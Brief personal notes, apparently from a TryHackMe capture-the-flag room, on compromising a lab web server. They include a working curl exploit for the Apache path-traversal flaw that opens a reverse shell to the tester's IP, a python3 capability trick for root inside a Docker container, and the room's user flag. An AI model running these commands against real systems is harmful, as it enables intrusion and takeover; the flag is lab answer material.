Oh My WebServer:

Webserver with a template front
gobuster reveals /assets
there is a .DS_Store file, webserver is running on Mac OS
Version has a listed exploit - 2021-41773
Features RCE, could be promising
curl 'http://10.10.122.114/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; sh -i >& /dev/tcp/10.6.15.130/4445 0>&1' -H "Content-Type: text/plain"
Great, the exploit works and I got a revshell
Docker Container
got access to a shell
export TERM=xterm
i am running as user daemon
This is really weird, there are no other users and some common programs like text editors are missing
Also, prior enumeration revealed this is Mac OS, I must be in a VM or Docker container…
root directory has .dockerenv, I am in a container :’(
Priv Esc from container
no SUID files are super interesting, one apache file with a CVE but doesn't appear to be compatible.
getcap -r / 2>/dev/null
python3 has a weird form of SUID?
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
worked, got root on the container
user flag: THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
STUCK HERE: I don’t know how to pivot or break out of a docker container
